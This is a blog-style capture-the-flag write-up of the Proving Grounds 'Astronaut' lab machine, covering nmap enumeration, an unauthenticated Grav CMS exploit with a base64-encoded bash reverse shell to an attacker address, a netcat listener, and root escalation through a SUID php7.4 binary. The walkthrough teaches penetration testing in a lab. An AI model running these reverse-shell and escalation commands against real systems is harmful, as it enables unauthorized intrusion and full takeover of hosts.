---
layout: post
title: Proving Grounds Astronaut Write Up
feature-img:
thumbnail:
subtitle: 
date: 2023-11-14
author: "lowercasenumbers"
category: [Proving Grounds]
tags: [Proving Grounds,ctf]
---
Astronaut from ProvingGround Practice, is a warmup machine that has a short exploitation path. Rooting the box requires a known exploit and an simple privledege escalation. As always, good enumeration is key. 

# Enumeration
Initial enumeration of the machine was done with: `nmap -sC -sV -oA nmap/initial 192.168.245.12
```bash
-sC for default scripts
-sV for service version enumeration
-p- for all port s
-oA to save the output to a file as .nmap, .gnmap, xml (all formats)
```

Following a scan of all TCP ports, the results below show only port 80 is open which simplifies what to look at next.
```bash
# Nmap 7.94 scan initiated Fri Nov 10 08:29:45 2023 as: nmap -sC -sV -oA nmap/initial -p- 192.168.245.12
Nmap scan report for 192.168.245.12
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 10 08:30:07 2023 -- 1 IP address (1 host up) scanned in 21.48 seconds
```

Review of the initial nmap scan we identify that port 80 is open. Browsing to the website, we identify that Grav CMS is being used. While we do not see any specific version infomration, we can still look for potential exploits. 
![Grav-Webpage](/assets/img/blog/pg/astronaut/grav-webpage.png)

Using SearchSploit we can see a few possible exploits. Cross-site scripting is generally not going to provide us with an entry point. The Server-Side Template Injection requires authentication. Arbitrary YAML Write/Update could work so we take a look at the exploit details. 
```bash
searchsploit "Grav CMS"
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                                                                                                              | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross-Site Scripting                                                                              | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated)                                                                                         | php/webapps/49961.py
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)                                                                                              | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)                                                                                              | php/webapps/49788.rb
gravy media CMS 1.07 - Multiple Vulnerabilities                                                                                                                 | php/webapps/8315.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# Initial Access
With a potential exploit identified, we should take a moment to review the source code . Taking a look at the 49973.py exploit, we see a target is hardcoded in a variable named `target` and a base64 encoded payload and an example of how to replace it. 
```python
... shortened for brevity...

target= "http://192.168.1.2"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');

... shortened for brevity...
```
In our case, we can replace the target with our target `192.168.245.12` and can run the command `echo -ne "bash -i >& /dev/tcp/192.168.45.240/4444 0>&1" | base64 -w0`. This will out output our base64 encoded payload. Using this, we can modify the exploit as shown below. 

![Exploit Modifications](/assets/img/blog/pg/astronaut/49973_mods.png)


As we specified in the payload, we setup a netcat listener on port 4444 using `nc -nlvp 4444`. Once setup we can run the exploit using `python 49973.py`. It may take a few moments for the shell to be returned. After waiting for a minute, we recieve the reverse shell as the user www-data.
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.245.12] 41192
bash: cannot set terminal process group (7130): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$ 
```

# Privilege Escalation
Doing some quick enumeration we can check to see if we can run any commands as root by running `sudo -l`. Unfortunately, this prompts for the password of the `www-data` user which we do not have. 

Another quick check we can perform is looking for any binaries set with a SUID bit. This would allow that binary to be run as the user who owns the binary. Most often this is the root user. To test it we can run the following:

```bash
find / -perm -u=s -type f 2>/dev/null

...shortened for brevity...

/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
```

While some binaries such as passwd need to be run as root some can be abused. Checking GTFOBins identify that the PHP binary with an SUID bit set can be abused by running `/usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"`. In our case, we run the php7.4 binary which escalates our permissions to root. 

```bash
www-data@gravity:~/html/grav-admin$ /usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"
<sr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"
whoami
root
ls -la /root
total 40
drwx------  6 root root 4096 Nov 14 22:04 .
drwxr-xr-x 19 root root 4096 Mar 29  2023 ..
lrwxrwxrwx  1 root root    9 Mar 29  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr  3  2023 .cache
-rw-------  1 root root    9 Apr  3  2023 flag1.txt
drwxr-xr-x  3 root root 4096 Mar 29  2023 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwx------  1 root root   33 Nov 14 22:04 proof.txt
drwx------  3 root root 4096 Jan 24  2023 snap
drwx------  2 root root 4096 Jan 24  2023 .ssh

```

# Other Notes
When performing my enumeration following gaining my foothold, I found a cron job that ran every minute. This at first appeared to be the path to escalation. However, when taking a close look at the grav binary, it should be noted that this is owned and run by the `www-data` user. While its possible to replace this with a malicious binary and recieve a reverse shell. Doing so would result in a reverse shell as the `www-data` user. Had this cron job been run as root, we could have leveraged it. 

```bash
www-data@gravity:~/html/grav-admin/bin$ crontab -l
crontab -l
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
www-data@gravity:~/html/grav-admin/bin$ ls -la
ls -la
total 2176
drwxrwxr--  2 www-data www-data    4096 Mar 17  2021 .
drwxrwxr-- 15 www-data www-data    4096 Mar 17  2021 ..
-rwxrwxr--  1 www-data www-data 2205196 Mar 17  2021 composer.phar
-rwxrwxr--  1 www-data www-data    1658 Mar 17  2021 gpm
-rwxrwxr--  1 www-data www-data    1552 Mar 17  2021 grav
-rwxrwxr--  1 www-data www-data    1586 Mar 17  2021 plugin
```

When running `linpeas.sh` on this box, it highlights the grav binary as a 95% likely privilege escalation attack vector. Its important to closely review the output of automated tools and be able to filter out false positives. Linpeas is a wonderful tool and if run in this scenario also identifies the `php7.4` binary which we were able to leverage. 
